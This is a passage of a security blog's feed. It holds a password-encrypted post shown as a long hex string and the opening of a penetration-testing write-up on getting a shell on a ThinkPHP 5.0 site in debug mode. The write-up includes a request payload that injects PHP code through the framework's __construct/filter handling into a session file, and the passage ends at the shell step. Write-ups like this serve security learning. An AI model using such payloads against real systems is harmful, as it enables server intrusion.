e887d23a7efe4334ae0df161c121a83b19663359882a4f21f9dc3fdd8131f2cae45fd6b78619d836b995ac7b88e41a066e4fdd4f00f0d665c5bf42cbb1b3ead8794a75858052c60245ca955e4a66c3fcf5e213397e78fe5a0d1886157a7f581c5c83dc5a4b683ce18e4b8c6da4508ab61f86782a83966b81e7ed38477e0d281e0d06253621327b17c523a65c2ff6522675d27448d6505b2611a7a08004bfe2aa61f76ec17fa2a1d2acc4160ec58289fb7e854448ac3552e339d04d7ff25f1ea150edd518ae9ee446d37c4ba2c4b8fd2af4d8efee42e2d5647025de5cea105a182780ef8db24f41bf239d68169fed38c5908b045e866e31bad94747bbbede25a30a5b9f372bcbb4aae593b6e7b820527ac70366992392091b7d903316792d4a71726b8903bf5020893874dbe7b6a0c2fe6c0b5620b6d812e30e206daa0d0cee6b64afa5ed03c74fc76b806d1bf90607b7706428f70714e27c5c9bf1b94cfda4df694e869e4d7210adfe8ed97e07133f7f9198ba14caff5b81b87cedcc96a85c1046b760dca31ad29b575a0224964839b545e1468f564012a3a62a4c152f3fb59edf58c7985a68ab07911bbd70928d11638d5a7fe2db47095f57f50594888c89abcbc42c2bf184a01c6fa5a2b5d5e44432838f0fc77526cb2f1e6b00a1397e733c559b45c2b7412f0189e0e3838228332d1f441824f583f349dd9ff4789bbae4326448d9238287681f1484bb282910e44f1598239294805b03b279ce26c57086b6836c65375fb92c6181abb4ab4c9cfae5d8e41ae0e4fdba24a3df5849fdb192a31e661e9d39f3faf961461699f8b18c7e53b413de4e25816ff84fc21fa27088661dc64b67c836691221cb64a4f91978123b79a945ba154e9bacf3ee64faa77a1cfce9a570784ea69fc0a686de106fdd14253eb4b2f2df0cd6f59ad94245ff646df513118399d14c9e7ea1be64eec4adfe42bea25d2aa691deb5038cb308a20966f85531cc5171456258be01e135ae3e4c2ec02e4b894c86dfcdbb99f1d008894b146a9f6cf7eda5c9d9018a9cc5669b0b0279cf6b05399ebe14a9538b8eb5df192aa0dc7241c2d1dc0d066e722eda226912047e99c6d963877019172ce15f45d0373b01a202232c1411bfdd330340187e1d045684adde81b1d5afef07b97358166246ac94e7e25eb044bb4fd5cc7b4b707d5ad45abc33a2ed046666511cd7ccf28f93036617766d1fa64cd2a82c2a3aba821e1fea26ea09b1d7d58ef8ab60e198017917da841c0d7adaf2a7257343cf823db4c3b642c6fc99dc0d88520cd32408cfd5d19ef631e126f99edd5615ec9b5e32927a097b378eb9d7833bbeebd677e442b97997af4831ab03eab1af6551baf8cf8eeb5c799542d4276427661941fda62244f5b2aa87ce9a5b241665bf9c759ed608e73e0122be3a66c56da28d774c7ca7ff9834a7a66afef91ffec06b7ef16c4e63635184bf5008948a286e1f5bad1ed0493e2e546db08e286be53bbc3ac03fe3fca7d13f75cada9e2692f2c925fd567ab51ec72eac7f94b8f74ddd7dd89403196847698cf9401a3be1f533dd2e0ea08170e85a5b26beede00a20c644cc337009f1f1f8f843ac0477d21768babae779f507d734c1975d28d6eab1764d11ac6b518c0bd384fcb641a0dc97c2fc2d8f36197ab9a628189a09478e1597d97e63a11cdcf49000ad163e2e96b69da231626d125d69b164b48eef2451afb14347bed76b431b43882487d70a68bbee25e18f1b146be60e7f9f9e6827066229721e3f85868b9b6153dac552466e5f9114e1a24f9793477cec4351ba814dd7a2ac17cd63b00f90e1636da573a5e2df077975a47f860ff5c8f78297992805daed6f971db6f238aed44592e1ebda167ea14f7a181e941ac37cfe50b7e902c79ee56f8a2c5763a8d30743cfc20cb2f329d8ee1d90c5af59c31a0080d88d985d3e40cdba0b43e455dadfa6a642435aba7d4899fbbbbc7091247c919916c7570fe458dc5945c32399c85cd13150f6d6f586f97f01548c06bd44f317e8883f51fd551df89a75a22b801bd091363c9a12f6b7e9fad905ec8be1e211e10d40ea41bfc057d0f078b5879e69c68b2561b4e87716a16d57f0c0bad922bfcb3b864e0e94edc0ae9e6161464bf639329f53bfdd56bf76d75cbdbcd75fc3c43d2a1d732ab0ed7c1f9b056be93240ec5e6d17dc44fc3a11db572d5416e2ce65f4d6791f408842ea3fcf3ec3903284fe7c5435e9fb14c6391f47c54a1a50991229a478241eb68c0e78767a55bca11eb44e7857d1c394dfa241b28cddcde924d36d71a1215df894333e8f81b0a8faf6b70f224c91d47472dd79082d0fc194a61a4b4ba0e8887a32aeb87f4cd14144a3b473d1804177d52c1d4d74ec3ebe80921eef352129d94a90eafae8bf3aecb48136afa7ebcf827e2d63557e2b1a7958a9d90b132c8cc25690eab8380ba0c8840c7f724094e94a399869c6deaaa5774b52fcbf45b02326f57d9d35b5166875f2764d2a69233d00c9a9992390f62f538317019c06f0296c29eadf7cd6b2ad342d7d1f6632b3d001cc16a0dda3c87801c00df308446ea44223b4bca5b7de37d50632e1f5986e94665e35345a9e51834307746b530c394abee55189ae69abf3fed14e34fd7875c6b0a5dd5c568e298e28311bc5aeb814502ce69f711f99157adaddb852f429e289108ada8cbe5685e9e5221d5db2370ce603331f65b2d120e6fc4475b014533a22563f5fc77aa81bfa5d878d0e0656cb76f6e1a2c918c7eced0656373389c5b8838d859045b6fbf9e0498066c49a24fb0504748fd3532a2014f4407363ddcea186e4ef077f9c54d305584061f17da3704d9dd537888ef6057dc24e2fc03a8a14191f326644a919fb194208547fad52382816576451b8d0658ac502c84b036e7f398dc435f0ef067f20ca323c1148b95a775aba943a21729aa87c699d44d2b0e85acae280bc5ac75fd7dbebb676b9ddd4686401e59251059c8c8d32754cd4d8a6808b017f689a4c018c6d6b24ee33a7b1f592e1e0adbb57e37c5ffa133bada68b14b9311a2f220d889cb40d62205b13380c8c8b939db78738b635a222ef93b6f6ebb9d9df834d496764b5dc9c8057b5761999f89dca2a69b7942e4eecf619dd1f6b6d8fd31c36137fb69c6411b51ca45144683b4c9d2af7b4a2c93f2ad40c35663f1eb4ee804982e367815abf9559cea30de4bf2f319b4c041d15aabbbb985cdc52a906a33e519bf7e77ecdba455aaf349a09eb9b218d85cd83eedca956cbd672931f59177fdadea28d45cf458612a03a735d5bf22d4c408e55bdd8884b40522878cfcad407bd6874eba86cde76562da997b8e1cf13dd0ace5f83ac1db0e7608022b4932fc7dc651977abed9548078b37db05edb87df42c79207688d407d868cee5259e5e2e0135fe24f3fe2510e289e477a786b1554b8306f800b5d1f67dc10d919f0de98a61caf0d9c95fbb8e66c36ebc90cd76f1740321f4ee00c5c5c334ae35dc139b0876c4dc2a87823c3564f7ce5cb2cafe3c8db85622de15b45d90df5da8e0b79ec97fa341cebe3f6b0821a93c378068490ea724538323619b4e0464444e39d2b147f3fd4c1fb77b672be194221867813480d1dee55d93d150d41a35c1c9c0056641dbd32c6ba224d90e3a660cb8fe055c79fbc0dcb2b81638f07bfb65ca6253d888095dd41b81aa54b825dfe4069c99d1b7b84ba9a5dbe3b7c0c83951dea40c2a2a7f775025bb074302b2077d17a4e24aa50f145fd5ed08b7f56e0cef4dac9fb624f09638b47fd74f1737cf45f81245f6948bb8f45e7e96643ec2b057d683126fb2c66f267c6041ef2f5d86c7f2eab99cd6d8c1e9ef42801cc9a6db4b3ec2995dec3b0dc3bbe656b49d34d856666df9e7b07bdcb2923192a1e74147009121940cbd25c1cb20ed7263a9e14d58fdaaa2427c253fa212fbe36cb9994196b2d82915f2caa0c8bafcfcf5abc83894ee34d1160fb02efbed022af898ffd1f45738e8b7c7464ca2b9e73042f1e0d566fad9da0bf2c3edf23b209d272ac1d2de7321c7b1c74ea78763c66c0af864874ad4e3a0da68220e4ba243530be65308177f0ad5e449779692684a8b1080f59c8334c5bed1aaf3a1736996cfdc9eac6c99b2b3107374361beac80b81d5dc22f8056c1dba3a4c445aa23ff9556083c5312cf78a735dce102c85553870617ad203fac2e0b855d0ec8e145d8a85e46e19a8df64b59385103a7184feeea1d11e8a86cf8226813b0657337cbd49add0b39ee497f685c4293027d9e842c6f3bdabcdff09a4287f227a9fb63fa67221c8f5385d8c036890e337e4af1d3722e2bf936b328e55ddefe178b46af155a36d63170133c2b4cb3f5cde9f2b28744aef75eec15139c787418bff84f379c4a2859e557b665474d37b28c758cd9e06683f4df8baea35f9ccb4a1aa4189f7702beb6421ad8db4976292289376ffaf4dcb46ab53450095b82ad333c5507dc82821cc3ce60870b45a307971b1e5d86f9c420dfc358d7ca02d4cbe77bea738a84192111ed8de3edb67da7698193003382da99a070dab262d88895d10ec9708da8a0ad1551c948bf2bed696273b17d490c32b928b9acab00404f3834e7ebbe0a47a8c0783aff31cdcc2ce4c297c89332004f56ab040b73e6cc2b7a489fd94b69747112552160c3854e814cbcc2430e1b7891eb3dd7d61af45cacbd56aefb50a8301fadb39e827b9af680323b7113f7bb0795e82e2d0f9975485af07a6e0db7172458ecadb4debd941bdc57ea085a825ae5ce062f414b5d80c1f42b31e7a38ff0b6eb0f53d6437b5d8b796989bc632435f7cacb67f650129297ffd81cb3d18a2d6ae0b53d0a02ad1b3c55573f3f5b845cdb4523be397aa31230d90a94f66939274eb8880f8cabaa8e1819d7002e0c27fcd98b018e48ec84072342893d0453e6076d8dcab87bed469172824ace60e64308641c0ff94ba63f34d1619948d7a38dfd8a04451e533b97a4ac623d66e5e294b73987a279e6fcd480272bf712e9792591820b1f5f4f8f64439584f6e2887aef9fd536ff2d9a8dcf31302fbef135d9e6562208fbeb5e12d332f976efcb9cd63e6848caa9506ef35b08283061047db36d572551383866d3357568fc30fd3d138ae8a9dea38e4dd146d3315c4451d59e62085f548a6807325f53b441cc1ad033b3f7183130377c6dd6023f9fc9dc39ae5481573f821368f01e95a7581a0185b513e0819ce9f1207f78cb5a4ef79be3dcf7b9ab7097ba6c61bb3c995c252d14d4e54eab80144cb08d77ddabd027236f849b820cb7ae391a1225d2360a492bbbdf12154895d6f86d79fa2bd05bfb9e37c6399c016d33cf3ac6d8ec193899d007d394162926d91bdf1b021cc3295083644990c529a40744758e88134d0f120ff6982d65b5a3f35bdbf247975e61a090f023592019ee4b766c9c220f32b9dd72fd8c0f25bae958a599a620a7fa71cd71861979e34663dafb2096e81cb63f97729a8276535082e41ff1bbca6f5235966f2578ef482f502d8fa7b5aff8e26e21a15c86601e5c37813b284eb5097b481bf9e7286706fc3ae99102f0f6c0e4b75043268fadb2e388cf0ef293ec39a2f1a5bcc069ec1c88a70954ceaa599fb2d93115a31885498250b4a81c19a3cad88a37ece3f7c35ca5718e7fe5a47bf52750d0fe3ff7cba67c3138144774cd607b2c27a2f1beedcba3eb39d9f79e773b3ee366303e195de7853b746153965dde0e68ff012939d6b09b94df2e65ac1d0eefe4b623323cfb31eae7dffdc487e2b45cf300329902d0e16c92da5aac6881883c925975b1cc861511af8d2ed2e6277b68753de5bd59dc5b9cf84765578a52313bc5156866603db94a9cc848981f0337b18876decc1510dd011297155213ecffdbb26c87f1e9be3d28629c86dd5abb114e4cd862e27d01c1a0cdee5e22812460183a867a6dd4e4010cf1aadd8270ef08469071addd86fd6dee2d60545156ca23e511a6bacabdf24b5d847bb57b3ddfaa9af76fc1571ebaefb827cd041d0015abfb79ee29425acc94ab17405630893059a3383d303ed5022f968843677ec35ccdbb07695abfe0861cd496f484cefabe81aef3cbdb75507f1cf921629bc9ea0ea9b85c8c27f247469011de079290b430b8d86d03cb70660cc8ccbe26c57798278265537d022c7c556d254a133fdb25ce5aae7e10930f50da8933819c3999ebe54a2843a87c4d74522ea15b45659d6c88ce8ad8dc650d55e00c0658c1d8e05a54e432f8e8cea2c854970dca09492f01a13bae787b490072aee143e181901818bd979da757849903ce62dd51a3a37680698baff1a04d7a072b31e640f5567cfce6cd36bd6cde820ce26ce037abde3e8069ad8bf125eeedd5180070e68914595859b3da6998d734f11004969eeb5b08cbb2e849922d9da204e3ec65ef2e49081be3df6682930ffd05610ed3af93efef7f7f88edb80d5e92713ecff040b035b0444035ed028daa5870b50bea0d3e61402707ba692c18e8cc48e13821aa442ad2d68268df892e17c6abd7573e55b3e624f8a4aec739f33e6b94319fad47be71a46ae5d82b4345bab1208a4a9dd4080a5b39164fa9c0558ac06c329bcd52de1fac810f7a2647051c56f1210cca0120bac3438504219035a5de7fed4f4d9cc08bf0e21ad6bece89f7bb60403d74e2c3b5315143187777e0584387a4dd69c1bfa90fe2e1b112bdfb1da6ecca085f47cd948f9eaff53a3c02b43b004b9790c4e88a1801dfc1e0c7507a03b63c0600ec219e00a945cbfe4af73be811ed51902867f5c4193aa2eb38b499f7c13d5b1eb788b58b660e0bbeead4306898d04de13fc95bd7d9cd720af0dd5a1b3a9ab4f8a9a20350ae3a648ba197a7f501e39ee0dc172dc4312379748104276339ef5417cf2c67d09ad0e189cd6c8024c0861ee368bf568cefd44aeed99e54e5ff7f54553ccb751e174b2566247613bf5a8298dceaf7b72331519da6c253ca718d48828ed3258462d774d87bef4a51dd1736fd85abe57c3e722814c9e244cdf7fa8279505559c8832399cf1bf783a60c2d888bd2001c08b0d3e15e2a31fc7e2894df1c38bb8f94af9d28c85030a09ac3cb815c51afbae919cc9cd1f8ac485c02085b6cffd6afb5bcf951b4b106678c8c08eafb6ed3730f8cf476358d4999cba32bae1d8b1464f50b1be6ef397442a65d651f761a9b23880e183bd89fabc109a201c94ab20c6daea4d9cbf6cff1d6e710111b638aab44ecf83b303bd10104d9ea3713e32c8a91560ae3c255c16e04c336d237e7a5c0aa548bff1fdbec4cb26b4a8ce9bc98b2bb44ac9b5bc60a520d1e25f97162476cd55f3f77b1b31703985bd8d2e0cb20d68e606aa09062991c297db42657c4bfe1bd92719fc1901701155697c40450ecc6bd142d68a106f02574cc798aacd0484fc6b20378bde3c4f4ac6f4ccf011d7a799b4e02a2422da83261cfebcb09266c49e9e3e0557cbd390b28620c90075fd5cc331ebeb5dac8f709e9ffdda85dbeadd1dbb171845702cf182a910fab6149b3ddbab71af0ab9e05790312c3917ffe7c9eb66745e948ad8e3a9cdf3b6e4daee3222d3dfe437286d842618bf290efca33589ce52b2e28882e61c068c258d0dda103639a35dc290b91440cbccdc504f4d3b9cd620b75152e292786a8322d4a11bcd1acadf20ff976cf245cb8b9840d8a3e688f2968adac27c8d12a097aebe00177558fa5ce5bdb84b460d841b895027ed74b95f1a93308d6462ecaeb49a9bdfdd1c1d61e1ae524dadfe3dd8617918fc031c88d1573d03899a2ec02ecd5cb95221eb16b27de7974788351d30db970ff688d40ff790b3e12dc96e00377fc7675fccda22e0e2020eb3b851f8de0e79d181db5c933c63ff47bee1464264a98fcbb0b3ff6ad0379863d3231069d304c3c0ec3a420b618b957f9c30c8e02d2e83a611de20a1c96b8a5e48949d488e03042d5d1a203dc6a7f8e053952d4d84b0101d265b73e4eb37843055c4dd1a15a9021da6b2e109cc07b697f7a9d09558cf3544c8d291578f6aa56b31330bf17f33dae89b035a06d06867fcecc579ab707db0fed3f38c0d5759765aec102c8c993a90cf5292314f5ebedee1f303e7424cc41fcb07efbf0720b4cf24645b1b889b8fe12dc713c98946d90439ac247a35398b4640bc7c01ce2951fa960e436671714694b5f518ccea93f09a7a8924088a196625a8b351b6b3bb8688b15359a691d4a06b5e808e31812f064f40a7982bf24ec55c79ec1f8a6e63effa3a9c593d4feb381a3b1066f220654e012fcb2838d41c98036d566a96c67a9bc8ecbfce422a3d9ec4ecb10fbdf23cf2cc97bc27aeaede8723098fa4d48475d58f5a0f62d82c2d2b515d48c635124a83516c01bd0eed154ad85fd7aaba0dce9133e7f4d25dcc22d58c25303effab78552b44c73825f66a5354829f593f6f46546f692c1c0b8c11586976fdab8283e483121105186d48d8fb3f803cffec11d2dfc90b924665240ac67f788e5c3b203c8ee64bd00fcff5db908703c302e2b41bc5453fea39bc03accf1ae4439e3a98f0c600df29423f14a2d9b153894e9319cf35902173fcd50b7c123cb05d52ede45207108f997784349c423fef2b991ae23e5f220f06ad1aae0939259944ad5508a2e1b47b61bacaf131beacabc835d378a78ee36aa3503239352bc87c83e227079e09d6da25313bd5fa5ecfcb4028d8c95825b44cb1f2139447d232b0e2e6e8207b5baa529f810b9632c5c1e2697e675e7d4a6ddaa9dd022621eba5008d9344ae1b2e5d26fe44db0856bc6f2e38f27e03e3af711aab70bfe9911242297b5fe4bc27191d7459d64f0fecac069549b7f24b8e95b4b6d89ef679f67925476134e6e74dd2fc7db9843826d6760cf8ba0f3b5089ca043b93247a002b1fb9e476fc31750bde10dc5dcf7336022cea2ed0f2789421ca399697d9f44f19bf04c995daa9b4338fa8e2e449e3648e69005950db1acfa50efbbd392e5eb9310b2929f4b5f6c20c2d95bdf252c176e2b635c0ca69c3e887b56254adf3675bb98af0a6feb0f7b2533f97347e7ab989b48840adabab5a1998e8f0d97043a52c655b8e5f448b7b899a98788aff1c34c99bbccb43b55e5032747ae205df281c5161c42a88cf49abd4df1c86d63d8cd835863eecc2582bf38819f76ef08ee7c6c4e7061cb118bbf994fa1452f5a9cdb82c403961cf1c33c66f4f42f002ffeaec20c567356f4d159fe08713c1adb9393c9befc0c1959a6a1bc48c74b501283c747914facc1eea528e0746445cdd4594d965182c39518dd4aed61c817bef19eaad1a8aaf57218c5a1aed82c074123a68e5afddd244d805c8db6e9974c74567431a3a577fc6a30ca28a93ca89e80e467147ff7551c1cb983c11f4d779607ee70d2a57b0c83167006b468cb0f635d1bf7955856865d55986a6b8d96d744c6a9a7d96cd02383fe6d801df6e47d34fae32440eb844acdc98b68c1cff0e35971db4e333048e619011a97accc3c3dbf8363a53beccc9bb5b211e39ef753df888dde659d83c4096dd3578917a2045886271758de0f5d808d35b691b75f75e7dac355b4c1081d7e934a7e8e7726f0f5a9ae734c7fd2d685597acd88980eb170b716057508666057ec93a22392eaed6049b64690f4dd56d7d3615285eecfd4b36d5f32b92d32de28ffcda793dc35e549665c2e43425f6d1f141ae0d02a4acb1bef6b4189b652113bb2f757069a62c2508987f3dbd02808efddebec1a0d2ce12583b0665132d698c850427d3ddbf0f10ef9834d2e896f665fde49329061f57740ba5b376e19166d4375fd3562c2661ce5318de32629f86d0be5b0d87056b5bf37889ff21fa8395abeccf8ae31dfd52a05c8ea448193ade47a04eef0208844f711bad84a5e75a694f9bc34da72bd6eac9340be5809aef8bb43bd39098aea36f4faeb9914474a6938be1e8b7110082e17975ecfbbfb3779d7694bdc45f7141d5c2b763403f120352e659fb895f59f0fc414ef54b3d7e0d79c52d695750ec6f2f4688f2059ce48a7a75ff9174c923205de4aeb8471dd6ce6b455b645fd7a9bcf920c1668248416013c5c4cdb4ee290604f5705d66ac88d6437dc6a1088afc7421441c59e8bcfb6811db03c73868e6f89c3c225e929324c90832c4b2679cb460e5308189b0579a66e9c5cb735d60bf1e3116c3e78aed7503c4b06ea29d941132b1d2c2be1fcb6a95d6b993f924d49ec660e9df89f55652e5ef3af7c58a8f41209ff4cdb707fc65f84c6d0c9434525c47fb25f48eb706b76da20bd841ae8fcb371f0b48e2f4ffb4f1f6cd2b0ef3113dd3ab6d2456f9f55fa4dad8e3425e4c09685b89ec71c131373877203fe34770cc9b97a2a823144175a4430e03f5247754b8594e65c22a79487b37c203bfd7ed023d4984f2e1937f2c2ce8ba5fde41722d6e9e50fa1e40bee2471658edeca1554f1e77050e2072b0c57c036814b1452512e0ae5212ec68528c14faf4ea83cc6e36c95df2b2bc564b572b681888c438deade0be90b941c8b4761cea0ebb766662206f3311973f41fa58b7845e620318bb09f9c37fe744a145a10938ff3962c242218fd6fd2edd220e7864bb37af7acf79c6fef7222436500afc91b93f6c4d7cabf192f70c37d2e4ee244a02f931f32bd7a3733abd7f0c8a596d913a8c24696f2aeb5ed93f18a6c1047cf5bdaf92bfe0118427a5bcbb7b0714855064f1f488c5147c66e8feb262f47ca06e7203d398430d50d991668f3c5ee19e873b7d2423a63bca3bdaed8afd50f80b58d2bfba872ab47c6e303909f2c2241107b0d2fa8a7b9fdf44554c40e92d0f27e047cb4b97445f687f4dc8b94fa7875a8a7e0c9595c9e71002af63ec10ccb21b7d99c642606e2108e6423bbaba75e928fbdc2c681d9382b7672459f67eeae6f335e5aa4f31de7d249818b851bf050c8ac8d4b4217156e875a681f6dbb9f652c34c41b42990f2df6991a6ca5c4b7d627ae5c439dc838ba957cdab452beed0b2141881627bbb9e38775baeb2f8d00f20c82a5f88170f6fd4ffc4eda32e7c134adfad0e2783f8ef2cacd2964f5f92b6c6274b21533478261cbe0ca8c132b3e9653f0732446cec486b9b8f20f3cf3e32d33821a71ac5ba7ae831696f2ef662c95518b98096e0ac3f37a22cbfd951c8f306190707bf3e6fe6edefd54b29082ec8f7602cd6841d758eb141489ecb005c81952be15f7f30d5acf331c30e7953f043441f55dbeb46db8fced35f918705d5007cd993614c2970b6fd6df3de2480ca5fe85795f1aaf0edcd9d5dbe4b1ec198208660c5e6aeea9d8ed86907fcdbc399c1056089f493e034602212e062352705bbb0235b1c160b66f2b8fad44937dd7326afecde78d0bca863d35c6e87f69e9cbbf8b9a5a47d1571e91b817a7d8f62f8ed276cbc4a6298b569f5b2b7c73c03deff234c9298810a096492bcea103f3e3a4f12c0d73da0457597ac353fdbb3544622ce67656cb641bc9e64f6c80247677319b5338eaef9656756efe36cc82dc65b8ed6c5d618ed0f34de46745564c356d79f3ee13efeb21748d9b428e84c9932a3244dc8370974c2ead5ba18b7dae239f18acf4148d2230cc5eb807b9045cad2a20aba137dba3565e80d49f95c76d1f0935d4590553580ed485b64b974e3389dcfece12e73bae7d52c6bb12d30b0a9f888ab7ab48d8230c985157968535223deff2960bb3d2c8511e06139b2a615ff04903fcfd9f30965aaf341dae81a0ef1ba325df701101be3b2be1e1e0979698b9ae638852e6413f7d4a423eb33c839aa3c293c6bc6d5b392292d5644a7723ed5c7e4ecb23ad1f2588b7ca928e3b40be4e3ad110998d03ea644345c6889e665d30f0b49d34dc0214551f89bdf8560329d893704f7b9dde212f9515d64b3313fd5b1aa87de7b6d9a5d8935228827316617936746af180bf4028de0b5230b57171e6c7329bde33c4e20f6b9678f4f10155f3071cdc8e09aa81683a9c90554986969927063d3e7a88b019afa3989445c3392125acfd2e87b7404e5ab09b77d35f37f9b798aac772ba2e078eb9b0e0114982095de450b536544a46020fbec1c662b8dff37c8bf61f691b182bd386b84ee78eabc6a0bcc14c04f6237db90d532039bd693c66a3c488a4b387638ccf86e4db31fb67f7c36f233d246b0c49963d48463e812025976754090a1c50a58c071ed55d35621876baf9e8bec4e43ef03686ce511cf193c011411c9a58956535eb1ecd9e901a87cf11799ff25d6aadf10c0d34dc15b1c057e8ab55069bcf283f98fadb785db639d49fdffdda4d1e43c2b69056573ffbff1371248e74c9a092285ba5d7f6131ef771f98443f4929e6aa6fa711de7fac42b0a33a1ce1e8373c278b2e93d2e7fc74161dfc6b2bf0e437abe43e036900ad141eb033728364fd988eee1094385b45054194fc946046ead7251db3fe269e391d23a29707d245c9c0a96a8d36e8bff3663929b9878d66f58fce60289f50fbfcbcfe6da0624a76a6b1a8a7b57d335bd6b93ec8b536dbc9ab1510b34d61c90ee499b8eb75b14fa1a91dbf8c4783007f270f9a1047f67dd25870a869914f1185c311ae103efc015551d96baefabeccc3801d8cee0f1ee88681ac5eaf84db70ddd3792ec1385a7532f8a87e2db1eea488c7819870d751c0ca744b15459c4bdb9191766c46e4301e6d1946c26d99c87b2920b71416e394b03d9947c380464b960e40259570c1f4618548d31c06c9ccda3fb8a98ff13a4f34a4de1158f52e68a9883002615ea76549f6d679162357dfa7e9c5476cd24b73719de622359313ac3fe252ccc0ffa10038adba26fcde63fdb10a6e62fe3ceb9501aaeead8bae7497616cfbb786a7fc7386fe044ac0f3e85b079f3ea97517e788c269d8b595673d4217d136f77af6464b596d7851016e607bad4154a281298020e14c27bd6c557eb469c6968d1016b5f939f00b2d6f2685a3f27defd9a4240857e48c312ff67f8153bdca7ee0e2fccabf63bb4d287ceb5a039f9eaea6894f94cfc25e00f1951f55e370586f7e01791dc7d4adf76346f5471724df0926586f22b78b056830272cfc362f9f27c83a2ee8720902155e6c9c5ee3c51a0aeb12840a24e114afee139a0dadfe7f78dd54bf6f5b0653b8a50d5c4e8e3f7012c616b15293e879ede74ff539fc322cf7094216d111ccebecb9c0b525e7c33d4cbc9797d9bc405817eb942bc8f0dac18af7c8b5a7462c4af0e1a78841ab927108151837651651f02e397c9f2096283dcbf18b226131798f972148afeeb002086234b1aa01ad5d13d469de47709c19577b285f6c9cb25db58beeee87b1414360f144a87d33c64da0c813c0f4e2280c193396fc27e0d02172deeb7d2029dce51027891c3c1d31761bab24f577f24c052b89d60765fb2bfee9b1fffa626780e74b0ef0896e5aa9891aebdaa302fa04d1307798936775ed765ad43553effa26a60c4111885846a8fe724e1ca9da1198410df089c404c8486fc5005476cf53ec816810c72f6cc86517e525f9c00a8cf60c198da60eb75703b5f23bf2f8bb69ece72e279dc41ed9143dc1294363d4835d360c9a22e2e6901cb4851284d2d0e8fa7cf9e2b1839102daf9bc71dff733eb2f914795a9045f0f80d6b741a5ee940cac4f5b51640dd5015fe1dc3023ab8b9e94ed493811c8e9761f119af5c065b4a027fe1b0da0ee3ea4147aed2d902b819b2aad395a87299de9b2b8d38a115e0d10f88d75a53bcc0ced449a857074c8b47c125f6417f307300ef02c89a14da62d50425b3d2bdd02efb27901dae68317524d913b1556a71bbf79a88edf17e1479887f502c3b035b5943acea82c9853f19e5ed1aa8a659839637f86c8fdd228802d6f31d85dfb02ef9067954eb2577781c1ed68de54a9377a28ad1889e50719dca566c94633ce9ce5b628ec2c9615615f1903b20b60ea47c809a1fb2e1b29bb9e5a77e9dcb30ad8be16b4fa70751b1cd9ab655c59a267a30b29ae44d6b8341a6eb82b630a1fe0709c7053c9b2c8dfddf8e830188a0faa61458f5032819f0d44e590fbaf677e2b81d4963f7855d0c6b8c0337579fca8841f1829ddd0fe12ce7ff12cc1e763a3c2f1a1d0350784886f3d0b316dd81e69df05429dd8475d903b28f74ab04e362220bc60f5ea47fbd64233d7426844eb79ec61e647c04eb4ed4390a8804d7e2d0513a2cdf0a7c4503e2e3b2923e1451df9d6e59e76a8556a3b7ac74799f60683b595cd3beea65cc3eab34d99b02b319c60b5bfabb43b3638cff2d68c8bb01ff35b74fb8b74b77bcdac5202d29421b39338854fc6bc0ad9ce4c4810681efb52cf06f1b6a656f840e24ae3cbbe1a51f136fd90fe656b75d69e522ac195fe9b21edca2c33031af5fdce7397ca3e970e990056c394fb365415774cefa11c855bc9ea6ed2657f60dee4ece7c2d5686d27e138fe5e25414df0be093ee26047ba1bfd07dc34deaa43f412d80951516d0c01cfb61273eebe59c18e2b39be0d2b2b7cadf67ecf7bf275bb9d062b23f7705796b7cd0bbf07890bc16e032b3c8b7321add261f5de2f2908b083482795aac375d34b048f226868ed200410294d782024a4690e23b6f5145e884a96422ec560db46c12a952136695be9809ace6a043186b24d44421525dce783d559ee1ba6586087c02c61ef16fc1490488e75d80c99d3ab6bd2b4f23bcf53132f09c8110d8967c45312c9a03b03c0a66a2e1836c700aae4ce96aa8e55bfdab30f4cccb96c1348b6f283874339bcd17c7dce764aad1a0b1215958f980ad11902aad3d154282a6008c064b29b3bd83aa3ec98b8f3f462247d1d8a668a7ee4c889783e70e29378561e33b413930ae215cae822974ba3b55ae</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>渗透记实|ThinkPhp绕过限制GetShell</title>
    <link href="https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/"/>
    <id>https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/</id>
    <published>2020-02-14T02:10:24.000Z</published>
    <updated>2020-11-14T19:59:20.128Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发无法溯源安全团队公众号</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>项目里遇到一个站，用的是ThinkPHP V5.0.*框架，且开启了debug模式，本以为一发payload的就能解决的事情，没想到拿下的过程还得小绕一下…</p><h1 id="0x02-踩坑"><a href="#0x02-踩坑" class="headerlink" title="0x02 踩坑"></a>0x02 踩坑</h1><ol><li>尝试命令执行，system被限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/1.png"></p><ol start="2"><li>尝试包含日志文件，open_basedir限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/2.png"></p><ol start="3"><li>这里有个思路，可以去包含runtime下的日志文件，但是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行，暂且作为备选方案</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/3.png"></p><ol start="5"><li>尝试通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>但是。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/4.png"></p><h1 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" 